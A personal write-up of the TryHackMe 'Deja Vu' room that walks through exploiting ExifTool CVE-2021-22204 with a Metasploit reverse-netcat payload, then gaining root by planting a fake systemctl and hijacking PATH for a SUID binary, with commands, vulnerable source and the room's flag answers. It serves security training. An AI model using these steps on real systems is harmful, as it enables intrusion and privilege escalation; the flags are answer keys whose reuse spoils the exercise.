<h1 align="center">Deja Vu</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/e151a71b-1f29-4a59-995f-b65f1bceadf0"><br>
2025, August 29<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>480</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Exploit a recent code injection vulnerability to take over a website full of cute dog pictures!</em>.<br>
Access it <a href="https://tryhackme.com/room/dejavu">here</a><br>
<img width="1200px" src="https://github.com/user-attachments/assets/7f6e0c49-0709-4a50-8810-350f7618a986"></p>

<h2>Task 1 . Deja Vu</h2>
<p>This room aims to teach:<br>

- Exploring a webapp to discover potential vulnerabilities<br>
- Exploiting a discovered vulnerability with Metasploit<br>
- Privilege Escalation by PATH exploitation<br><br>

While this room is a walkthrough, some elements will rely on individual research and troubleshooting.<br>

Credit to Varg for the room icon, webapp logo, and design help throughout the webapp.<br>

Cute animal pictures sourced from the TryHackMe Discord community staff.<br>

Writeups in the format of a Penetration Testing Report are more than welcome. Other writeup formats will be accepted based on quality and novelty.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy the virtual machine, wait 3-5 minutes for it to boot.<br>
<code>No answer needed</code></p>


<h2>Task 2 . Dog Pictures - Exploring a webapp</h2>
<h3>Webapp Enumeration</h3>
<p>After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.<br>

From Nmap's service version detection, we know that the backend is built in Golang. This hopefully means dynamic content that we can explore.<br>

The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: Walking An Application.<br>

Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. Click around the website. Can you find any developer comments?<br>
<code>No answer needed</code></p>

<p>2.2. Can you find the page that gives more details about a dog photo?<br>
<code>No answer needed</code></p>

<p>2.3. Perform an Nmap scan of the target. What version of SSH is in use?<br>
<code>OpenSSH 8.0 (protocol 2.0)</code></p>

<h2>Task 3 . Vulnerability Discovery</h2>
<h3>Delving deeper</h3>

<h3>Discovering the overly versobe API</h3>
<p>Burp Suite's target site map should have discovered 2 API routes that the website uses to retrieve information about the dog pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.</p>

<p>It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the OWASP API Top 10, more specifically API3:2019 Excessive Data Exposure. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. What page can be used to upload your own dog picture? Hint : Try a gobuster scan as suggested!<br>
<code>/upload/</code></p>

<p>3.2. What API route is used to provide the Title and Caption for a specific dog image? Hint : Check the BurpSuite Target site map!<br>
<code>/dog/getmetadata</code></p>

<p>3.3. What API route does the application use to retrieve further information about the dog picture?<br>
<code>/dog/getexifdata</code></p>

<p>3.4. What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp? Hint : Look at the API endpoint from the last question in BurpSuite's target map<br>
<code>ExifToolVersion</code>

<p>3.5. What version of ExifTool is in use?<br>
<code>12.23</code>

<p>3.6. What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX<br>
<code>CVE-2021-22204</code>

<br>
<br>

<img width="1121" height="367" alt="image" src="https://github.com/user-attachments/assets/3b7ca6f6-ad5d-4ec1-b0e3-b6aaf23cb588" />

<img width="1122" height="260" alt="image" src="https://github.com/user-attachments/assets/cf20d8ea-5625-4cae-8546-83f1490030e6" />

<img width="1123" height="261" alt="image" src="https://github.com/user-attachments/assets/b9a560c9-0059-49d6-a703-0d5ae8afc7ad" />

<img width="474" height="196" alt="image" src="https://github.com/user-attachments/assets/d8ba91d2-4523-48c4-af24-35b9c7182ac1" />

<img width="1196" height="191" alt="image" src="https://github.com/user-attachments/assets/8557a749-e9a7-4813-b3f9-6dfad93a8287" />

<img width="1186" height="198" alt="image" src="https://github.com/user-attachments/assets/701f36a5-7056-4b8b-8ece-3cc28e59ac0c" />

<br>
<h2>Task 4 . Exploitation</h2>
<p>Now that we've discovered a potential method of exploiting the box, we should try it!<br>

Turning our version disclosure into remote code execution massively increases the severity of the issue.</p>

<h3>Why is this exploit interesting?</h3>
<p>In the Microsoft ecosystem, there's a concept called "Patch Tuesday"; security patches for Microsoft products are often released on Tuesdays.<br>
Practically immediately after these patches are released, work begins on creating exploits for the vulnerabilities as many systems will not be immediately updated.<br>

Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear, however many security enthusiasts began to reverse engineer the patch to create an exploit.</p>

<h3>Looking for the patch</h3>
<p>Researching the vulnerability, we can see it was assigned CVE-2021-22204. Looking at the NVD CVE page for the flaw shows that it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how they fixed the vulnerability. The git diff is copied below.</p>

```bash
-	230	# must protect unescaped "$" and "@" symbols, and "\" at end of string
-	231	$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-	232	# convert C escape sequences (allowed in quoted text)
-	233	$tok = eval qq{"$tok"};
+	230	# convert C escape sequences, allowed in quoted text
+	231	# (note: this only converts a few of them!)
+	232	my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+	233	r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+	234	$tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
```

<h3>Understanding the code, and the danger</h3>
<p>The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that's contained in a variable, and the variable comes from EXIF data in our image. Control over code that's executed is our goal, so it currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.</p>

```bash
# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
```

<p>It's worth explaining the =~ that's used here. It's a Perl operator usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character after the ~ is 's'. This means that the operator will perform a search and replace with the regular expression that follows.<br>

That regular expression is also very complicated, unfortunately. There's a helpful comment explaining the intent, escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding our filter which wasn't captured in the diff, is that this filter also relies on quote marks delimiting the ends of fields.<br>

Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter and have Perl eval our own code. As this filter is irritating and the exploit is somewhat complex to engineer, we'll simply use Metasploit to craft our exploit. Articles describing how an exploit was created manually are included later.</p>

<h3>Creating our exploit with Metasploit</h3>
<p>To create our exploit, we need to first find the Metasploit module for this vulnerability. If you're unfamiliar with locating exploits in Metasploit, try the TryHackMe Metasploit Intro room.

We then need to set our options appropriately for a reverse shell payload. As it's a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!</p>

```bash
msf6 > search exiftool

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.147.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   JPEG file


msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > 
```

<h3>More information</h3>
<p>If you didn't like my explanations, want to learn more, or you want to see how the proof of concepts were created, please see the links below.<br>

- https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/<br>
- https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool<br>
- https://www.openwall.com/lists/oss-security/2021/05/10/5</p>

<p><em>Answer the questions below</em></p>

<p>4.1. Generate an image payload with Metasploit<br>
<code>No answer needed</code></p>

<p>4.2. Get code execution on the target machine<br>
<code>No answer needed</code></p>

<p>4.3. Retrieve the flag located in /home/dogpics/user.txt. What is the user flag?<br>
<code>dejavu{735c0553063625f41879e57d5b4f3352}</code>code></p>

<h2>Task 5 . Privilege Escalation - Enumeration and PATH Exploitation</h2>
<h3>Privesc Enumeration</h3>
<p>Now that we have code execution, our goal should be rooting the box. Fortunately, something should immediately catch your attention if you run ls -lah from the current working directory. A SUID binary! The presence of one of these in a home directory is quite unusual, but it looks like we have a file left by the server administrator to help manage the webserver. It also looks like we have the source code for this C program, very useful for exploiting it.</p>

<h3>A note on SELinux</h3>
<p>SELinux improves security by essentially setting out rules that processes are made to follow.<br>
While SELinux can make hacking a box more difficult, it can also make administering a server more difficult.<br>

Rather than trying to configure SELinux to allow the webserver to bind to port 80, the system administrator just disabled it. This is a somewhat common approach, but is by no means the "correct" approach which would be learning the fundamentals of SELinux and configuring it correctly. With the command getenforce we can verify whether SELinux is enforcing its rules (the command prints disabled).<br>

While SELinux doesn't affect the privesc we use here, it is worth bearing in mind in real pentests or harder rooms.<br>

You can read more about SELinux at these links:<br>

- https://selinuxproject.org/page/FAQ<br>
- https://www.redhat.com/en/topics/linux/what-is-selinux</p>

<h3>Understanding SUID binaries</h3>
<p>A SUID binary has special permissions, allowing the program to use the setuid system call. The setuid call allows the process to set its user id. If you call setuid(0) and the process has the correct permissions, then the program will then run as root.<br>

When a program may need to run parts of the code as root but does not want to run the whole program as root, SUID is often used. An example of this would be the webserver Apache2, which initially runs as root to bind to port 80 and then subsequently drops these elevated privileges.<br>

SUID binaries can only set their UID to the owner of the binary's UID unless the binary is owned by root, in which case they can set it to any UID. You usually don't have to call setuid yourself, the program will usually do this.<br>

A more modern alternative to setuid binaries is Linux Capabilities, which offer much more granular control over permissions such as CAP_NET_BIND_SERVICE which allows programs to bind to low (privileged, under 1024) ports without running as root. The capability CAP_SET_UID is equivalent to  suid permissions, allowing the program to call setuid</p>

<h3>What does the vulnerable binary do?</h3>
<p>If we run the binary, with ./serverManager, we get a choice of operations.<br>

Selecting 0 gives us the status of the webserver service, and 1 allows us to restart it. Restarting the service would usually require root privileges, so it makes some sense that the binary is SUID.</p>

<h6>Reverse Shell</h6>

```bash
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:00:08 BST; 19min ago
 Main PID: 776 (webserver)
    Tasks: 7 (limit: 5971)
   Memory: 76.8M
   CGroup: /system.slice/dogpics.service
           └─776 /home/dogpics/webserver -p 80

Sep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.
```

<p>As we have the source code of the application, we can more easily see the vulnerability.</p>

<h6>serverManager.c-vi</h6>

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```

<p>The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.<br>

We can also use a program called ltrace which allows us to see system and library calls, although this is not installed on the machine. Pay close attention to the system() seen earlier that provides systemctl without its full path. </p>

<h6>james@centos</h6>

```bash
[james@centos]$ ltrace -b -a 100 ./serverManager
setuid(0)                                                                                          = -1
setgid(0)                                                                                          = -1
puts("Welcome to the DogPics server ma"...Welcome to the DogPics server manager Version 1.0
Please enter a choice:
)                                                        = 73
puts("0 -\tGet server status\n1 -\tRestar"...0 -        Get server status
1 -     Restart server
)                                                     = 41
getchar(0, 0x25d62a0, 0x7f8d48b99860, 0x7f8d488c56480
)                                              = 48
getchar(0, 0x25d66b0, 0x25d66b1, 0x7f8d488c55a5)                                                   = 10
system("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:28:17 BST; 6min ago
 Main PID: 894 (webserver)
    Tasks: 6 (limit: 24819)
   Memory: 17.9M
   CGroup: /system.slice/dogpics.service
           └─894 /home/dogpics/webserver -p 80
)                                                      = 0
```

<h3>Explaining the PATH variable</h3>
<p>The PATH variable tells the shell where to look for binaries that you call by name, so for example ls is actually /bin/ls. It consists of a sequence of directories, separated by colons. Your shell will run the first binary that matches, looking in each directory left to right. This direction is important.</p>

<h3>What are we exploiting?</h3>
<p>We're exploiting a combination of two things here.<br>

Firstly, the binary runs as root due to SUID.<br>

Secondly, the binary calls systemctl with an incomplete path (eg not /usr/bin/systemctl, just systemctl on it's own.)<br>

Because the system will run the first binary it finds from PATH that matches systemctl here, we can make our own fake systemctl to run instead, which will be ran as root (as it inherits the UID and GID of the parent process).<br>

Our fake systemctl can be as simple as /bin/bash in plaintext to start a new shell - Linux treats executable text files as shell scripts.<br>

Let's create a fake systemctl, add it to path, and get root.</p>

<h6>Reverse Shell</h6>

```bash
[dogpics@dejavu ~]$ which systemctl
/usr/bin/systemctl
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
[dogpics@dejavu ~]$ chmod +x systemctl
[dogpics@dejavu ~]$ export PATH=.:$PATH
[dogpics@dejavu ~]$ which systemctl
./systemctl
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
[root@dejavu ~]# whoami
root
```

<p>Let's break this down:<br>

[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl - We're creating a plaintext file with the contents /bin/bash which will start a shell when executed.<br>

[dogpics@dejavu ~]$ chmod +x systemctl - We need to make our fake systemctl executable, otherwise it will be ignored.<br>

[dogpics@dejavu ~]$ export PATH=.:$PATH - here, we add . (our current working directory) to the beginning of PATH. This means the system will look in our current working directory for binaries before searching the rest of PATH, and find our fake systemctl before the genuine one.<br>

[dogpics@dejavu ~]$ which systemctl - To check that our fake systemctl will run if the command systemctl is used, we use which. which essentially does the PATH lookup for us and prints the results.<br>

[dogpics@dejavu ~]$ ./serverManager - Run the vulnerable binary!<br>

From there, you should have a root shell. As a warning, your HOME variable is still /home/dogpics rather than /root so you will need to cd /root. Then just grab the flag.</p>

<h3>Further reading on this method</h3>
<p>https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</p>


<p><em>Answer the questions below</em></p>

<p>5.1. Stabilise your reverse shell to ensure that you can run interactive binaries<br>
<code>No answer needed</code></p>

<p>5.2. WFind the SUID binary<br>
<code>No answer needed</code></p>

<p>5.3. Verify (based on output) that the serverManager program runs systemctl when you run it.
Try running the same command as the binary yourself - systemctl status dogpics --no-pagerbr>
<code>No answer needed</code></p>

<p>5.4. Create your fake systemctl, ensure it's correctly added to PATH, and escalate your privileges.<br>
<code>No answer needed</code></p>

<p>5.5. Retrieve the root flag from /root/root.txt. What is the root flag?<br>
<code>dejavu{5ad931368bdc46f856febe4834ace627}</code></p>

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/34fd9940-751c-4c57-916b-66e2b1c6ac87"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9e4c2edb-c5a6-453b-9934-a9a08314027f"></p>


<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 29   | 480      |     111ˢᵗ    |      5ᵗʰ     |     238ᵗʰ   |    5ᵗʰ    | 123,336  |    933    |    73     |

</div>

<p align="center">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/a638bd45-3b13-4c4c-97c5-2467fd2c4b2d"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/d129cd57-3a73-4234-8dbf-6dfe8d09b26b"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d5b9a0e6-aa08-4b2a-9be8-dbfda497f8f6"><br>
                  Global monthly:    238ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/077037e2-fe26-4ea5-8912-b4a65ffe4d0c"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/56714663-2098-4409-a1b2-be3cbe20b3a1"><br>

<h2>Thanks for coming!</h2>
<p align="left">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
